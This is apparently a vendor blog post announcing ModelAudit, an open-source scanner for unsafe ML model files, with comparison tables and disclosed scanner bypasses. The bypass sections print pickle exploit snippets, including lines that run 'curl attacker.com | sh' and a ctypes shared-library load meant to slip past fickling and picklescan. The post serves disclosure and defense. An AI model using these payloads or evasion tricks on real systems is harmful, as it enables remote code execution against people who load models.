---
title: 'Open-Sourcing ModelAudit: A Static Security Scanner for ML Model Files'
description: 'ModelAudit scans 42+ ML model formats for unsafe loading behaviors, known CVEs, and suspicious artifacts. Now MIT-licensed and open source.'
image: /img/blog/open-sourcing-modelaudit/hero.jpg
keywords:
  [
    ModelAudit,
    ML model security,
    AI supply chain security,
    model scanning,
    pickle security,
    malicious model detection,
    PyTorch vulnerability,
    ONNX security,
    open source security scanner,
    model file scanner,
    AI security tool,
    CVE detection ML models,
    machine learning security,
    model serialization attack,
    deserialization attack,
    model supply chain,
    Hugging Face model scanning,
    torch.load security,
  ]
date: 2026-03-03
authors: [yash]
tags: [company-update, model-security, open-source, ai-security]
---

# Open-Sourcing ModelAudit

Before joining Promptfoo, I worked on model scanning at Databricks. The same failure mode kept showing up: teams pulled models from public registries, ran `torch.load()`, and treated the artifact like inert data. Model files are executable at load time. Evaluating and building scanners there taught me a fundamental lesson: blocklist-based scanners will always be reactive — an attacker only needs to find what is _not_ on the list.

For the past year at Promptfoo, I've been building ModelAudit, a static security scanner for ML model files. Along the way, we filed 6 GHSAs against existing scanners — including a CVSS 10.0 universal bypass — and validated against 200+ real models with zero false positives. Today we're releasing it as an MIT-licensed open-source project.

<!-- truncate -->

## What it does

ModelAudit is a static scanner for ML model files. It flags unsafe loading behaviors (deserialization RCE, archive tricks), known CVEs, and suspicious artifacts across [42+ formats](/docs/model-audit/scanners/), without executing the model or importing ML frameworks.

[ModelAudit](https://github.com/promptfoo/modelaudit) is the open-source engine (Python, MIT). `promptfoo scan-model` is a CLI wrapper; you can also run `modelaudit scan` directly.

```bash
pip install modelaudit
modelaudit scan your_model.pkl
```

The scanning engine runs entirely offline — it never loads or executes the model.

<details>
<summary>Example output</summary>

```
Scanning suspicious_model.pkl...

📊 SCAN SUMMARY
  Files: 1 | Duration: 0.29s
  Security Checks: ✅ 12 passed / ❌ 3 failed

🔍 SECURITY FINDINGS
  🚨 2 Critical | ⚠️ 1 Warning

    └─ 🚨 [suspicious_model.pkl (pos 45)]
       Found REDUCE opcode with non-allowlisted global: posix.system
       Why: The REDUCE opcode calls a callable with arguments, effectively
           executing arbitrary Python functions. This is the primary
           mechanism for pickle-based code execution attacks.
       opcode: REDUCE
       associated_global: posix.system (os.system on Unix)

    └─ ⚠️ [suspicious_model.pkl]
       Model affected by CVE-2025-32434 (PyTorch weights_only bypass)
       severity: CRITICAL
       affected_versions: torch<2.6.1
       remediation: Upgrade to torch>=2.6.1

  ❌ CRITICAL SECURITY ISSUES FOUND
```

</details>

Capabilities:

- **Formats:** PyTorch, pickle, Keras, ONNX, TensorFlow, GGUF, CoreML, LightGBM, and [30+ more](/docs/model-audit/scanners/)
- **Output:** Text, JSON, [SARIF](https://sarifweb.azurewebsites.net/) for [CI/CD integration](/docs/model-audit/ci-cd)
- **Extras:** [SBOM generation](https://cyclonedx.org/), license detection, secret scanning
- **Remote pulls:** S3, GCS, Hugging Face Hub, MLflow, JFrog, DVC

```bash
# Scan from Hugging Face
modelaudit scan hf://microsoft/DialoGPT-medium

# SARIF output for GitHub Code Scanning / GitLab SAST
modelaudit scan model.pt --format sarif --output results.sarif

# Via the Promptfoo CLI wrapper (requires Node)
npx promptfoo scan-model model.pt
```

Python 3.10–3.13. Linux, macOS, Windows. No ML framework dependencies.

**Who this is for:** Platform and AppSec teams that need to gate model artifacts in CI/CD. If you pull models from public registries or run third-party checkpoints, this is for you.

---

## Why model files need scanning

When you `pip install` a package, you probably run it through a dependency scanner. When you download a model from Hugging Face and call `torch.load()`, what checks are you running?

For most teams: none.

In pickle, `__reduce__` defines what gets executed during unpickling:

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned",))

# When loaded via pickle.loads() or torch.load(),
# os.system() executes the command.
payload = pickle.dumps(Exploit())
```

This is not theoretical. [JFrog found roughly 100 models](https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/) on Hugging Face containing similar payloads. Some of these models bypass the platform's _entire_ scanning pipeline.

**Example: [0xnu/mnist-ocr](https://huggingface.co/0xnu/mnist-ocr/)** — The `mnist_tokenizer.pkl` file in this repository contains `__main__.ImageTokenizer` instantiated via the `NEWOBJ` opcode — a deserialization attack vector that executes arbitrary code on load.

| Scanner                | Result                                                                            |
| ---------------------- | --------------------------------------------------------------------------------- |
| VirusTotal             | No Issue                                                                          |
| JFrog                  | No Issue                                                                          |
| Protect AI (ModelScan) | No Issue                                                                          |
| HF Picklescan          | Flags suspicious imports (informational)                                          |
| ClamAV                 | **Suspicious** — signature match: `Py.Malware.CodeExec___main___ANY_STACK_GLOBAL` |
| **ModelAudit**         | **CRITICAL**                                                                      |

Only ClamAV catches this one, and only via signature matching — not structural analysis.

**Example: [Rammadaeus/tflite-flex-bypass-poc](https://huggingface.co/Rammadaeus/tflite-flex-bypass-poc)** — TFLite files containing 4 malicious custom operators: `FlexWriteFile` (write arbitrary files), `FlexReadFile` (read arbitrary files), `FlexPrintV2` (output exfiltration), and `EagerPyFunc` (arbitrary Python execution).

| Scanner                | Result                               |
| ---------------------- | ------------------------------------ |
| VirusTotal             | No Issue                             |
| JFrog                  | No Issue                             |
| ClamAV                 | No Issue                             |
| HF Picklescan          | Not available (does not scan TFLite) |
| Protect AI (ModelScan) | Does not support TFLite format       |
| **ModelAudit**         | **4 CRITICAL findings**              |

Every scanner in Hugging Face's pipeline misses this one entirely.

And pickle is just one format:

- **PyTorch:** [CVE-2025-32434](https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6) (CVSS 9.3). `weights_only=True`, the recommended mitigation, could be bypassed for remote code execution.
- **Keras:** [CVE-2025-1550](https://nvd.nist.gov/vuln/detail/CVE-2025-1550) (CVSS 9.8). `safe_mode=True` could be circumvented via a [crafted config within the archive](https://jfrog.com/blog/keras-safe_mode-bypass-vulnerability/).
- **ONNX:** [CVE-2025-51480](https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-10877916) (CVSS 8.8). Path traversal in external data references can overwrite arbitrary files.
- **Supply chain:** [Palo Alto Unit42](https://unit42.paloaltonetworks.com/model-namespace-reuse/) documented attackers re-registering abandoned model namespaces to distribute malicious models under trusted names.

Hugging Face hosts over two million models. Most organizations pull from public registries without scanning what they download.

## How we got here

### The Databricks foundation

At Databricks, I led security reviews on ML serving products that loaded customer-uploaded model files. Customers could provide pickle files — essentially Python bytecode disguised as data — and the platform needed to trust them. I built a pickle scanner, evaluated every available tool, and expanded coverage to additional formats Databricks supported.

That work taught me how these scanners are built from the inside, and where they break. The most common weakness was the blocklist approach: maintain a list of known-dangerous functions and allow everything else through. An attacker only needs to find one function _not_ on the list. The allowlist approach — deny by default, explicitly approve known-safe functions — is architecturally stronger, but harder to maintain because of the false positive surface.

### Building at Promptfoo

When I joined Promptfoo, the team was building [AI red teaming](https://www.promptfoo.dev/docs/red-team/) and [code scanning](https://www.promptfoo.dev/code-scanning/) capabilities. We could test how an LLM application _behaves_ at runtime, but had no visibility into whether the models themselves were safe to load. If a model file triggers code execution on deserialization, runtime defenses don't matter. The compromise happens before the application starts.

Working with Michael D'Angelo and Ian Webster, I started implementing the scanner architecture I'd been refining since Databricks. Michael contributed deep work on opcode-level bypasses. Ian pushed format coverage across the 42+ formats we support today. The goal was a modern, lightweight scanner with no ML framework dependencies — something you could drop into any CI pipeline without pulling in PyTorch or TensorFlow.

### The false positive problem

Different ML libraries serialize models differently. The same scikit-learn RandomForest saved with `joblib` vs `pickle` vs `skops` produces different opcode sequences. Upgrading Python or library versions changes which opcodes appear. An allowlist-based scanner that works on Python 3.10 might flag clean models on 3.13.

We ran 5+ rounds of false positive elimination against real Hugging Face models. Each round surfaced new edge cases: numpy's `_reconstruct` method, scipy sparse matrix construction via `NEWOBJ_EX`, sklearn tree ensembles generating hundreds of `REDUCE` opcodes in normal operation. We fixed them all.

The maturity milestone: 200+ models scanned across 14 formats, 5,000+ security checks, zero false positives on the final 100-model regression run. Since then, we've expanded to 42+ formats with 12 new scanners and validated against an additional 50+ models — all clean. That result triggered the open-source decision.

<details>
<summary>Full list of models tested (175+ HuggingFace repos across 26 formats)</summary>

**Pickle/Joblib (30+):** scikit-learn/tabular-playground, sklearn-docs/anomaly-detection, dvgodoy/sklearn-mpg, drewmee/sklearn-model, samarthahm/sentiment-sklearn, danupurnomo/dummy-titanic, julien-c/wine-quality, rajistics/california_housing, merve/20newsgroups, BenjaminB/plain-sklearn, julien-c/skops-digits, hibaraliyyah/emotion-recognition-sklearn, waseemrazakhan/sklearn-sentiment-pipelines, waseemrazakhan/tfidf-lr-sentiment-mc, cis5190/random_forest_model, Tuana/eigenfaces-sklearn-lfw, electricweegie/mlewp-sklearn-wine, nhull/random-forest-model, nestauk/multiskill-classifier, pppereira3/hw4_mnar25_classifier_mean, kantundpeterpan/frugalai-tfidf-rfc-tuned, opentargets/l2g_xgboost_777, risingodegua/wine-quality-model, nateraw/iris-svc, scikit-learn/skops-blog-example, kushkul/rf_model_skops, hf-internal-testing/tiny-random-bert, hf-internal-testing/tiny-random-distilbert, hf-internal-testing/tiny-random-gpt2, lysandre/tiny-vit-random, hf-internal-testing/tiny-random-xlnet

**PyTorch (10):** prajjwal1/bert-tiny, google/mobilebert-uncased, albert/albert-base-v2, distilbert/distilgpt2, huggingface/CodeBERTa-small-v1, microsoft/resnet-18, facebook/opt-125m, openai/clip-vit-base-patch16, xlnet/xlnet-base-cased, squeezebert/squeezebert-uncased

**SafeTensors (10):** sentence-transformers/all-MiniLM-L6-v2, BAAI/bge-small-en-v1.5, Snowflake/snowflake-arctic-embed-xs, intfloat/e5-small-v2, thenlper/gte-small, TaylorAI/gte-tiny, jinaai/jina-reranker-v1-tiny-en, mixedbread-ai/mxbai-embed-xsmall-v1, sentence-transformers/paraphrase-MiniLM-L3-v2, Qwen/Qwen2.5-0.5B

**Keras (20):** keras/bert_tiny_en_uncased, keras/resnet_18_imagenet, keras/mit_b0_cityscapes_1024, Redgerd/XceptionNet-Keras, nixsng/benign_keras, VickiPol/binary_models_keras_format, diyorarti/hate-speech-attn-bigru-keras, osanseviero/keras-conv-mnist, keras-io/lowlight-enhance-mirnet, Kaludi/food-category-classification-v2.0, Akshay-Dongare/kerasVggSigFeatures.h5, manufy/mnist_model_keras, mkiani/keras-unsafe-models, daksheshgandhe/pokemon_mobilenetv2.keras, meetran/painting-classifier-keras-v1, upendrareddy1/face-emotion-keras, marince73/multimodal-colon-cancer-diagnosis-keras, Senuda2004/plant-whisperer-keras, fbadine/image-spam-detection-keras2

**TensorFlow SavedModel (10):** keras-io/monocular-depth-estimation, keras-io/bert-semantic-similarity, keras-io/semantic-image-clustering, keras-io/structured-data-classification, keras-io/timeseries-anomaly-detection, keras-io/text-classification-with-transformer, keras-io/super-resolution, keras-io/image-captioning, google/bit-50, merve/deeplab-v3

**ONNX (14):** Xenova/distilbert-base-uncased-finetuned-sst-2-english, Xenova/bert-base-NER, Xenova/e5-small-v2, Xenova/clip-vit-base-patch32, Xenova/dinov2-small, Xenova/toxic-bert, Xenova/slimsam-77-uniform, Xenova/ms-marco-MiniLM-L-6-v2, Xenova/bge-small-en-v1.5, onnx-internal-testing/tiny-random-Data2VecAudioModel-ONNX, Xenova/all-MiniLM-L6-v2, Xenova/whisper-tiny.en, sentence-transformers/all-MiniLM-L6-v2

**GGUF (10):** ggml-org/tinygemma3-GGUF, HuggingFaceTB/smollm-135M-instruct-v0.2-Q8\_0-GGUF, PrunaAI/gpt2-GGUF-smashed, mradermacher/gpt2-alpaca-gpt4-GGUF, mradermacher/jina-reranker-v1-tiny-en-GGUF, second-state/All-MiniLM-L6-v2-Embedding-GGUF, RichardErkhov/distilbert\_-\_distilgpt2-gguf, M4-ai/TinyMistral-248M-v2-Instruct-GGUF, Felladrin/gguf-smollm-360M-instruct-add-basics

**TFLite (10):** bbouffaut/bert_base_uncase_tflite, nyadla-sys/whisper-tiny.en.tflite, SamMorgan/yolo_v4_tflite, tflite-hub/conformer-lang-id, axtonyao/gpt2-fp16-tflite, Nihal2000/all-MiniLM-L6-v2-quant.tflite, ColdSlim/ASL-TFLite-Edge, byoussef/MobileNetV4_Conv_Medium_TFLite_256, Ashish094562/plant-model-float32-tflite, qualcomm/MobileNet-v2

**OpenVINO (10):** OpenVINO/Phi-3-mini-4k-instruct-int4-ov, OpenVINO/TinyLlama-1.1B-Chat-v1.0-int4-ov, OpenVINO/whisper-base-int8-ov, OpenVINO/bge-base-en-v1.5-fp16-ov, OpenVINO/Qwen3-Embedding-0.6B-int8-ov, echarlaix/distilbert-base-uncased-finetuned-sst-2-english-openvino, echarlaix/t5-small-openvino, echarlaix/SmolVLM2-256M-Video-Instruct-openvino, sentence-transformers-testing/stsb-bert-tiny-openvino, optimum-internal-testing/tiny-random-SpeechT5ForTextToSpeech-openvino

**Flax (13):** ArthurZ/tiny-random-bert-flax-only, sanchit-gandhi/tiny-random-flax-bert, sshleifer/tiny-gpt2, sshleifer/tiny-distilbert-base-cased, sshleifer/tiny-dbmdz-bert-large-cased-finetuned-conll03-english, phmd/TinyStories-SRL-5M, jcopo/mnist, ArthurZ/flax-tiny-random-bert-sharded, lysandre/tiny-bert-random, hf-internal-testing/tiny-bert-flax-only, patrickvonplaten/t5-tiny-random, julien-c/dummy-unknown, jcopo/flux_jax

**PaddlePaddle (10):** PaddleOCR ch_PP-OCRv4_det/rec, ch_PP-OCRv3_det/rec, ch_PP-OCRv2_det, ch_ppocr_mobile_v2.0_cls, ch_ppstructure_mobile_v2.0_SLANet, en_PP-OCRv3_rec, picodet_s_320_coco_lcnet, MobileNetV3_small_x1_0

**NumPy (10):** pual/MNIST_NUMPY_WEIGHTS, nickosn/olmo_pretrain_numpy, plus 8 locally generated test arrays (float32/float64/float16/int32/bool/complex64, .npy and .npz)

**CoreML (5):** zimageapp/CoreML-Models (Fast-SRGAN, realesrganAnime512), apple/coreml-resnet-50, apple/coreml-depth-anything-v2-small, FluidInference/silero-vad-coreml

**CatBoost (5):** M0nteCarl0/Yandex-Catboost-network-anomalies-classification, SirineA/catboost-ddos-detector, artemgoncarov/catboost_models, moneco/catboost, Deepaksai1/catboost-fraud-detector

**RKNN (5):** csukuangfj/sherpa-onnx-rknn-models (Silero VAD v4 rk3562/rk3566/rk3568), devinzhang91/immch_rknn, happyme531/wd-convnext-tagger-v3-RKNN2

**LightGBM (5):** noisebop/lightgbm_model, irfankarim/fraud-detection-lightgbm-v1, Sant0s3/lightgbm-models

**MXNet (5):** public-data/insightface (genderage_v1, arcface_r100_v1, retinaface_r50_v1)

**R Serialized (5):** zinken7/movie_models_rds (lr_aic, lr_auc, tree_aic, tree_auc, master_df)

**Llamafile (1):** mozilla-ai/TinyLlama-1.1B-Chat-v1.0-llamafile

</details>

ModelAudit started as an internal capability within the Promptfoo platform ([promptfoo.dev/model-security](https://www.promptfoo.dev/model-security/)). Today's release is the standalone extraction of that scanning engine.

## The landscape

Several good tools exist in this space, and each has pushed the field forward. [picklescan](https://github.com/mmaitre314/picklescan) is [integrated into Hugging Face's scanning pipeline](https://huggingface.co/docs/hub/en/security-pickle) and is fast and practical at scale. [Fickling](https://github.com/trailofbits/fickling) by Trail of Bits can decompile pickle streams into readable Python and recently added an [allowlist-based scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/). [ModelScan](https://github.com/protectai/modelscan) by ProtectAI covers H5, Pickle, and TensorFlow SavedModel; ProtectAI's commercial [Guardian](https://protectai.com/guardian) extends to 35+ formats. [Safetensors](https://github.com/huggingface/safetensors) takes the strongest approach: eliminate executable code from the format entirely. If you can use safetensors, you should. But [roughly 45% of popular Hugging Face models still use pickle](https://cs.brown.edu/~vpk/papers/pickleball.ccs25.pdf) (CCS 2025), and the [conversion pipeline itself can be a target](https://hiddenlayer.com/innovation-hub/silent-sabotage/).

Where ModelAudit fits: it is the widest-coverage open-source scanner available, with format-specific analysis across 42+ formats, built-in CVE detection rules, and SARIF output for direct CI/CD integration. Our team has contributed [6 GHSAs across fickling and picklescan](#what-we-found-along-the-way), and in our [head-to-head comparison](/blog/modelaudit-vs-modelscan) against ModelScan, ModelAudit detected 16 issues across 11 test files vs ModelScan's 3.

### Format coverage comparison

The most meaningful way to compare scanners is format by format. Here is what each open-source tool covers (March 2026; see each project's repository for current status):

| Format | picklescan | Fickling | ModelScan | **ModelAudit** |
|--------|:----------:|:--------:|:---------:|:--------------:|
| Pickle (.pkl) | Yes | Yes | Yes | **Yes** |
| PyTorch (.pt/.pth/.bin) | — | — | Yes | **Yes** |
| Joblib (.joblib) | — | — | — | **Yes** |
| Skops (.skops) | — | — | — | **Yes** |
| NumPy (.npy/.npz) | — | — | — | **Yes** |
| Keras H5 (.h5) | — | — | Yes | **Yes** |
| Keras ZIP (.keras) | — | — | — | **Yes** |
| TensorFlow SavedModel | — | — | Yes | **Yes** |
| TF MetaGraph (.meta) | — | — | — | **Yes** |
| ONNX (.onnx) | — | — | — | **Yes** |
| SafeTensors | — | — | — | **Yes** |
| GGUF/GGML | — | — | — | **Yes** |
| JAX/Flax (.msgpack) | — | — | — | **Yes** |
| TFLite (.tflite) | — | — | — | **Yes** |
| ExecuTorch (.pte) | — | — | — | **Yes** |
| TensorRT (.plan/.engine) | — | — | — | **Yes** |
| PaddlePaddle (.pdmodel) | — | — | — | **Yes** |
| OpenVINO (.xml/.bin) | — | — | — | **Yes** |
| CoreML (.mlmodel/.mlpackage) | — | — | — | **Yes** |
| MXNet (.params/-symbol.json) | — | — | — | **Yes** |
| CatBoost (.cbm) | — | — | — | **Yes** |
| LightGBM (.lgb/.txt/.model) | — | — | — | **Yes** |
| XGBoost (.xgb/.model) | — | — | — | **Yes** |
| RKNN (.rknn) | — | — | — | **Yes** |
| Torch7 (.t7/.th) | — | — | — | **Yes** |
| Llamafile (.llamafile) | — | — | — | **Yes** |
| R Serialized (.rds/.rda) | — | — | — | **Yes** |
| CNTK (.cntk/.dnn) | — | — | — | **Yes** |
| NeMo (.nemo) | — | — | — | **Yes** |
| PMML (.pmml) | — | — | — | **Yes** |
| TorchServe MAR (.mar) | — | — | — | **Yes** |
| Compressed (.gz/.bz2/.xz/.zst) | — | — | — | **Yes** |
| ZIP/TAR/7-Zip archives | — | — | Yes | **Yes** |
| Config (JSON/YAML/XML) | — | — | — | **Yes** |
| **Total formats** | **1** | **1** | **~5** | **42+** |

| Capability | picklescan | Fickling | ModelScan | **ModelAudit** |
|------------|:----------:|:--------:|:---------:|:--------------:|
| CVE detection rules | No | No | No | **Yes** |
| SARIF output | No | No | No | **Yes** |
| SBOM generation | No | No | No | **Yes** |
| Secret scanning | No | No | No | **Yes** |
| License detection | No | No | No | **Yes** |
| Remote pulls (S3/GCS/HF) | No | No | No | **Yes** |
| Allowlist approach | No | Yes | No | **Yes** |
| No ML framework deps | Yes | No | No | **Yes** |

ModelAudit is not a replacement for these tools — they've all contributed to making this space better. Teams already using picklescan or ModelScan can run ModelAudit alongside them. SARIF results from multiple scanners aggregate in the same CI pipeline.

## What we found along the way

Building ModelAudit meant studying the pickle VM closely: how its ~30 opcodes chain together, how function calls get resolved, and where the gaps are in static analysis. That work kept turning up bypasses in existing scanners.

The pattern is systemic. Fickling has [10 published GHSAs](https://github.com/trailofbits/fickling/security/advisories). Picklescan has [40+](https://github.com/mmaitre314/picklescan/security/advisories). JFrog found [3 zero-day bypasses in picklescan](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/) (CVE-2025-10155/10156/10157, CVSS 9.3 each). Sonatype found [4 more](https://www.sonatype.com/blog/picklescan-bypasses) (CVE-2025-1716, CVE-2025-1889, CVE-2025-1944, CVE-2025-1945). This is not isolated — every blocklist-based scanner operating on pickle will have gaps. We reported six of our own.

### Fickling bypasses

My teammate Michael D'Angelo found that fickling's unsafe-imports list was missing high-risk standard library modules like `ctypes`, `importlib`, and `multiprocessing`. A pickle importing `ctypes.CDLL` to load a shared library — full native code execution — passed as safe:

```python
# Pickle opcodes (simplified):
GLOBAL    ctypes CDLL              # loads ctypes.CDLL
MARK
SHORT_BINUNICODE "./payload.so"    # path to attacker's shared library
TUPLE
REDUCE                             # ctypes.CDLL("./payload.so") → loads and executes native code
# fickling: SAFE (ctypes not in unsafe-imports list)
```

Trail of Bits patched this in fickling 0.1.7 ([CVE-2026-22609](https://github.com/advisories/GHSA-q5qq-mvfm-j35x)).

I found two more classes of bypass. The first: fickling's `OBJ` opcode handler pushed function calls onto the interpreter stack without saving them to the AST. Discard the result with `POP` and the call vanishes from fickling's analysis entirely:

```python
# Pickle opcodes:
OBJ(os.system, "curl attacker.com | sh")  # call happens at load time
POP                                        # result discarded from stack
# → call vanishes from AST, fickling reports LIKELY_SAFE
```

A pickle could spawn a reverse shell and fickling would report `LIKELY_SAFE` ([GHSA-mxhj-88fx-4pcv](https://github.com/advisories/GHSA-mxhj-88fx-4pcv), CVSS 8.6).

The second: appending a `BUILD` opcode after `REDUCE` exploited how fickling classifies stdlib imports as safe and excludes `__setstate__` calls from analysis:

```python
# Pickle opcodes:
REDUCE(io.BytesIO, b"")           # "safe" stdlib call — fickling trusts io.BytesIO
BUILD({__setstate__: <payload>})   # injects dangerous __setstate__ handler
# → fickling skips __setstate__ analysis, full bypass of all 5 safety interfaces
```

Trail of Bits fixed both in fickling 0.1.8 ([GHSA-mhc9-48gj-9gp3](https://github.com/advisories/GHSA-mhc9-48gj-9gp3)).

### Picklescan bypasses

On March 3, 2026, we published three GHSAs against picklescan. All three are credited to [yash2998chhabria](https://github.com/yash2998chhabria).

**[GHSA-vvpj-8cmc-gx39](https://github.com/advisories/GHSA-vvpj-8cmc-gx39) (CVSS 10.0) — `pkgutil.resolve_name` universal blocklist bypass.** This is the most architecturally interesting one. `pkgutil.resolve_name()` is a Python stdlib function that resolves any `"module:attribute"` string to the actual Python object at runtime. A malicious pickle uses it as the `REDUCE` callable to obtain a reference to _any_ blocked function — `os.system`, `builtins.exec`, anything — without that function's name appearing in the pickle opcodes:

```python
# Pickle opcodes (simplified):
GLOBAL    pkgutil resolve_name    # not blocked by picklescan
MARK
SHORT_BINUNICODE "os:system"     # the actual target, passed as data
TUPLE
REDUCE                           # pkgutil.resolve_name("os:system") → os.system
# picklescan sees: pkgutil.resolve_name → CLEAN
# actual effect: os.system obtained, ready to call with arbitrary arguments
```

The blocklist never sees `os.system` — it only sees `pkgutil.resolve_name`, which is not blocked. This bypasses the _entire_ blocklist in a single opcode sequence.

**[GHSA-g38g-8gr9-h9xp](https://github.com/advisories/GHSA-g38g-8gr9-h9xp) (CVSS 9.8) — Multiple stdlib modules with direct RCE not in blocklist.** At least 7 Python stdlib modules that provide direct command execution or code evaluation were not blocked: `codeop`, `code`, `compileall`, `py_compile`, `runpy`, `profile`, and `pdb`. A malicious pickle importing any of these modules reports 0 issues:

```python
# Pickle opcodes:
GLOBAL    codeop compile_command    # compiles and evaluates arbitrary Python code
MARK
SHORT_BINUNICODE "import os; os.system('curl attacker.com | sh')"
TUPLE
REDUCE
# picklescan: CLEAN (codeop not in blocklist)
```

**[GHSA-7wx9-6375-f5wh](https://github.com/advisories/GHSA-7wx9-6375-f5wh) (CVSS 9.8) — `profile.run()` blocklist mismatch.** Picklescan blocks `profile.Profile.run` and `profile.Profile.runctx` but _not_ the module-level `profile.run()` function. The blocklist entry `"Profile.run"` doesn't match the pickle global name `"run"`. `profile.run(statement)` calls `exec()` internally:

```python
# Pickle opcodes:
GLOBAL    profile run                 # module-level function, not Profile.run
MARK
SHORT_BINUNICODE "os.system('id')"   # arbitrary Python statement
TUPLE
REDUCE                               # profile.run("os.system('id')") → exec() internally
# picklescan blocklist has: profile.Profile.run ← doesn't match "run"
# picklescan result: CLEAN
```

These bypasses demonstrate why blocklist-based scanning is fundamentally reactive — each gap existed because the blocklist hadn't enumerated that specific entry yet.

### The bigger picture

None of this is a knock on fickling or picklescan. We're glad Trail of Bits and the picklescan maintainers fixed these quickly. The pickle VM is adversarial territory, and every scanner that operates there will have gaps.

During development, we created 36 proof-of-concept bypass exploits across 4 generations to test scanner resilience. 15/15 POCs tested against fickling returned `LIKELY_SAFE` — ModelAudit catches all of them. These POCs are test cases that drive improvement across the ecosystem, not weaponized attacks. We follow coordinated disclosure for all findings. The ecosystem gets more robust when multiple tools with different approaches are looking at the same files.

## How it works

_This section covers scanner internals. If you just want to try it, skip to [Try it](#try-it)._

### Defense-in-depth architecture

The pickle scanner uses a five-layer classification pipeline. The order matters — dangerous checks run first, before anything can be allowlisted:

1. **ALWAYS_DANGEROUS_FUNCTIONS (61 entries)** — Functions like `os.system`, `subprocess.call`, `eval`, `exec`, and `pkgutil.resolve_name` can never be allowlisted regardless of context. These are checked first and cannot be overridden.
2. **ALWAYS_DANGEROUS_MODULES (~70 entries)** — Module-level blocking for categories like `ctypes`, `importlib`, network modules (`socket`, `http`, `smtplib`), and pickle recursion (`pickle`, `_pickle`, `cloudpickle`).
3. **ML_SAFE_GLOBALS (~1,500 explicit entries, no wildcards)** — Individually vetted function entries for PyTorch, TensorFlow, scikit-learn, NumPy, SciPy, and other ML frameworks. Every entry is tested against real models. No wildcard patterns — each entry is a specific `module.function` pair.
4. **SUSPICIOUS_GLOBALS** — Contextual flagging for ambiguous patterns that don't match the allowlist but aren't in the known-dangerous lists.
5. **Symbolic stack simulation** — Full pickle VM simulation that tracks values through the entire opcode stream. Unlike fixed lookback windows, this eliminates evasion via opcode separation — no matter how many dummy operations an attacker inserts between a string push and a function call, the simulator traces the full chain.

The key architectural difference vs blocklist scanners: ModelAudit checks dangerous functions _first_ (layers 1–2), then checks the allowlist (layer 3). Anything not explicitly allowed is flagged. Blocklist scanners check their blocklist and allow everything else — so any missing entry is a bypass. ModelAudit's default is to flag unknown globals as suspicious.

### Format-specific parsing

Each scanner parses its format natively and checks invariants specific to that format's threat model. Some use allowlisting, some use structural analysis, all include targeted CVE detection. A few examples:

- **Pickle:** Walks the opcode stream, reconstructs `STACK_GLOBAL` targets (which have `arg=None` in pickletools; the module and class must be resolved from preceding `SHORT_BINUNICODE`/`BINUNICODE` ops), tracks memoized references through `BINGET`/`LONG_BINGET`, and maps `REDUCE` calls to their actual callable targets.
- **ONNX:** Parses the protobuf graph structure, normalizes external data paths to detect path traversal ([CVE-2025-51480](https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-10877916)), and inspects custom operator definitions for suspicious patterns.
- **Keras:** Examines both H5 and ZIP archive variants. Checks archive members for embedded executables and configuration files for unsafe layer types (Lambda layers, custom objects). Extension checks are case-insensitive to catch renamed payloads.
- **NeMo:** Recursively inspects Hydra `_target_` configurations for callable injection ([CVE-2025-23304](https://nvd.nist.gov/vuln/detail/CVE-2025-23304)), checking against known-dangerous targets like `os.system`, `subprocess.call`, and `importlib.import_module`.
- **PyTorch ZIP:** Extracts pickle files from ZIP archives, runs the pickle scanner on each, then cross-references PyTorch version metadata against known vulnerable versions.
- **Archives (ZIP, TAR, 7-Zip):** Checks for path traversal in member names, symlink attacks, and decompression bombs. Bounds member reads to 10 MB by default.

Lower-risk formats get lighter analysis. The safetensors scanner validates structural integrity. The GGUF scanner inspects headers and metadata fields.

### Format coverage

Scanner depth varies with risk. The pickle opcode analyzer is the deepest; the safetensors scanner mostly validates integrity. The count includes archive and configuration scanners that apply across model formats.

Risk level here reflects likelihood of code execution or file system impact during loading:

| Risk Level  | Formats                                                                                                              |
| ----------- | -------------------------------------------------------------------------------------------------------------------- |
| **High**    | Pickle, PyTorch (.pt/.pth/.ckpt/.bin), Joblib, NumPy, Skops, Torch7, Llamafile                                        |
| **Medium**  | TensorFlow SavedModel, TF MetaGraph, Keras (.h5/.keras), ONNX, XGBoost, LightGBM, CatBoost, TorchServe MAR, NeMo     |
| **Low**     | SafeTensors, GGUF/GGML, JAX/Flax, TFLite, ExecuTorch, TensorRT, PaddlePaddle, OpenVINO, CoreML, MXNet, RKNN, CNTK, R Serialized, PMML |
| **Archive** | ZIP, TAR, 7-Zip, OCI layers, Compressed (.gz/.bz2/.xz/.zst)                                                          |
| **Config**  | Manifests, Jinja2 templates, metadata files                                                                           |

Some "low" risk formats carry higher risk in practice. NeMo files have a known configuration injection vector (CVE-2025-23304). Others increase in risk when wrapped in archives or consumed by buggy loaders.

### Performance

In our testing, ModelAudit scans local files in under a second for single models under 1 GB. Streaming analysis bounds memory usage for larger files. Remote scanning speed depends on download bandwidth.

We'll publish formal benchmarks in a future release. If you have representative model types and sizes you'd like included, [open an issue](https://github.com/promptfoo/modelaudit/issues).

## Limitations

No scanner catches everything.

- **A clean scan is not proof of safety.** A novel attack that avoids all current detection patterns will pass undetected. This applies to every static analysis tool.
- **No runtime behavior analysis.** ModelAudit cannot detect payloads that only activate under specific runtime conditions.
- **No adversarial robustness testing.** ModelAudit checks whether a model file is _safe to load_, not whether it _produces correct outputs_ under adversarial conditions. For LLM red teaming, see [Promptfoo](https://www.promptfoo.dev/docs/red-team/).
- **No weight-level backdoor detection (yet).** We detect unsafe code in serialization. We do not yet detect backdoors hidden in tensor weight values. Techniques like [tensor steganography](https://labs.snyk.io/resources/tensor-steganography-and-ai-cybersecurity/) are an active research area; we're not aware of a widely adopted scanner that reliably detects this class of payloads today.
- **Detection depth varies by format.** High-risk formats get deep analysis. Lower-risk formats get structural validation.

ModelAudit is one layer of defense. It works best alongside safe formats (safetensors where possible), provenance verification (signatures, checksums), and runtime controls (sandboxing, network egress filtering).

## Try it

The entire scanning engine is in the [open-source repository](https://github.com/promptfoo/modelaudit). All scanners, all CVE detection rules, all output formats. Read through the code, run it on your models, make it your own.

```bash
pip install modelaudit
modelaudit scan your_model.pkl
```

- [Documentation](/docs/model-audit/)
